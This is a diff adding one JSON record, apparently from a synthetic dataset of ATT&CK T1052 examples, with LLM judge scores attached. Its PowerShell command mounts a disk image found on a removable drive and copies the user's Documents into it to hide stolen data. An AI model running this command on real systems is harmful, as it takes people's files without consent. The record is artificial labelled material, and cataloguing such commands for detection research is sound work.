@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume -DriveType Removable | Select -First 1 -Expand DriveLetter); $img=(Get-ChildItem \"$dl`:\\\" -Filter *.vhd* -Recurse -ErrorAction SilentlyContinue | Select -First 1 -Expand FullName); if($img){ Mount-DiskImage -ImagePath $img -NoDriveLetter:$false; $v=(Get-DiskImage -ImagePath $img | Get-Disk | Get-Partition | Get-Volume | Select -First 1 -Expand DriveLetter); $target=\"$v`:\\$env:USERNAME\"; New-Item -ItemType Directory -Force -Path $target | Out-Null; Copy-Item \"$env:USERPROFILE\\Documents\\*\" -Destination $target -Recurse -Force -ErrorAction SilentlyContinue; Write-Output \"Copied into mounted image $img at $(Get-Date)\" | Out-File \"$dl`:\\mount_op.log\" -Append; Dismount-DiskImage -ImagePath $img }",
+  "explanation": "Mounts a disk image located on a removable drive and writes local documents into it, blending exfil data into an existing VHD/VHDX container.",
+  "rationale_steps": [
+    "Find a VHD/VHDX file on the removable media",
+    "Mount the disk image to obtain a new volume letter",
+    "Copy local files into the mounted image",
+    "Log the action using Write-Output and unmount the image"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-a3760856-5a0605fc",
+  "source_prompt_hash": "a3760856",
+  "timestamp_utc": "2025-09-30T05:14:51.683873Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quotes, proper separators, correct escaping for drive-letter colons, and appropriate cmdlet/parameter usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts a VHD on a removable drive, copies user Documents into it, logs, and dismounts\u2014aligning with exfiltration to physical media\u2014though it depends on an existing VHD and mounting may require elevation on some systems.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:31:21.051202Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct pipeline operations, appropriate error handling with ErrorAction parameters, and proper string concatenation using backticks.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1052 technique by identifying a removable drive, mounting a VHD image found on it, copying user documents to the mounted image, logging the operation, and then dismounting the image - effectively hiding exfiltrated data inside an existing container on physical media.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T09:31:24.749338Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced syntax and valid PowerShell cmdlets, parameters, and dynamic path construction, making it parseable and runnable.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fundamentally fails to achieve its claimed intent of mounting a disk image and copying data, as `Mount-DiskImage` and `Dismount-DiskImage` require elevated privileges, contrary to the stated 'Privilege: None'.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T09:31:50.723276Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
